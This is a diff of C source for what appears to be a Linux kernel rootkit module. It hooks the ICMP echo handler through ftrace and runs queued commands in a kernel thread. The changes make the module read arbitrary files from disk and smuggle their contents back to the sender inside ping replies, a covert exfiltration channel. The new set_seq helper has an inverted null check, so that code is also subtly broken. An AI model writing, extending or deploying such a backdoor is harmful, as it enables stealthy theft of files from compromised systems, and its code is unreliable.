@@ -38,6 +38,7 @@
 #include <linux/icmp.h>
 #include <linux/mempolicy.h>
 #include <linux/namei.h>
+#include <linux/wait.h>
 //#include "fs/proc/internal.h"
 #include "ftrace_hook.h"
 
@@ -1771,6 +1772,7 @@ struct exec_event {
 DEFINE_SPINLOCK(exec_event_list_lock);
 LIST_HEAD(exec_event_list);
 static struct task_struct *event_kthread = NULL;
+static DECLARE_WAIT_QUEUE_HEAD(exec_event_wait);
 
 int make_exec_event(int cmd, void *data);
 static int do_icmp_echo(struct sk_buff *skb)
@@ -1823,30 +1825,53 @@ static asmlinkage  bool ftrace_icmp_echo(struct sk_buff *skb)
 		return real_icmp_echo(skb);
 }
 
+static inline void set_seq(struct icmphdr *icmph, unsigned short seq)
+{
+	if (icmph)
+		goto end;
+ 	icmph->un.echo.sequence = htons(seq); 
+
+end:
+	return;
+}
+
 static int do_send_file(const char *name, struct sk_buff *skb, char *buf, int buf_len)
 {
+	struct sk_buff *skb2 = NULL;
+	struct icmphdr *icmph = NULL;
+	char *cmd = NULL;
 	void *data = NULL;
 	loff_t file_size = 0;
 	loff_t size = 0;
 	int len = 0;
+	int l_name = 0;
 	int rc = -1;
+	unsigned short seq = 0; 
 
 	const char *fname = kstrdup(name, GFP_KERNEL);
 	if (!fname || buf_len <= 0)
 		goto end;
+	l_name = strlen(fname);
 
 	rc = kernel_read_file_from_path(fname, &data, &file_size, INT_MAX, 0);
 	if (rc < 0)
 		goto end;
 
 	size = 0;
+	seq = ntohs(icmp_hdr(skb)->un.echo.sequence);
 	while (file_size > 0) {
-		if (file_size > buf_len)
-			len = buf_len;
-		memcpy(buf, data+size, len);
+		len = file_size > buf_len ? buf_len : file_size;
+		skb2 = skb_copy(skb, GFP_ATOMIC);
+		if (!skb2)
+			break;
 
-		skb_get(skb);
-		real_icmp_echo(skb);
+		icmph = icmp_hdr(skb2);
+		cmd = (char *)icmph + sizeof(struct icmphdr);
+		memcpy(cmd+LEN_PREFIX_CMD+l_name, data+size, len);
+
+	//	skb_get(skb);
+		set_seq(icmph, seq++);
+		real_icmp_echo(skb2);
 		file_size -= len;
 		size += len;
 	}
@@ -1918,14 +1943,11 @@ int make_exec_event(int cmd, void *data)
 	ev->data = data;
 
 	skb_get(skb);
-	if (spin_trylock_bh(&exec_event_list_lock)) {
-		list_add_tail(&exec_event_list, &ev->list);
-		spin_unlock_bh(&exec_event_list_lock);
-		ret = 0;
-	} else {
-		refcount_dec(&skb->users);
-		kfree(ev);
-	}
+	spin_lock_bh(&exec_event_list_lock);
+	list_add_tail(&exec_event_list, &ev->list);
+	spin_unlock_bh(&exec_event_list_lock);
+	wake_up_interruptible(&exec_event_wait);
+	ret = 0;
 end:
 	return ret;
 }
@@ -1933,19 +1955,15 @@ end:
 static int kthread_do_event(void *data)
 {
 	struct exec_event *ev = NULL;
-	atomic_t lock_succ = ATOMIC_INIT(0);
+	DECLARE_WAITQUEUE(wait, current);
 
         while (!kthread_should_stop()) {
-		if (spin_trylock_bh(&exec_event_list_lock)) {
-			if (!list_empty(&exec_event_list)) {
-				ev = list_first_entry(&exec_event_list, struct exec_event, list);
-				list_del(&ev->list);
-			}
-			spin_unlock_bh(&exec_event_list_lock);
-			atomic_set(&lock_succ, 1);
-		} else {
-			atomic_set(&lock_succ, 0);
+		spin_lock_bh(&exec_event_list_lock);
+		if (!list_empty(&exec_event_list)) {
+			ev = list_first_entry(&exec_event_list, struct exec_event, list);
+			list_del(&ev->list);
 		}
+		spin_unlock_bh(&exec_event_list_lock);
 
 		if (ev) {
 			switch (ev->cmd) {
@@ -1957,13 +1975,12 @@ static int kthread_do_event(void *data)
 			}
 			kfree(ev);
 			ev = NULL;
-
-		} else if (atomic_read(&lock_succ) == 1) {
+		} else {
 			set_current_state(TASK_INTERRUPTIBLE);
-			schedule_timeout(HZ);
-			set_current_state(TASK_RUNNING);
+			add_wait_queue(&exec_event_wait, &wait);
+			schedule();
+			remove_wait_queue(&exec_event_wait, &wait);
 		}
-		ev = NULL;
         }
 
         return 0;
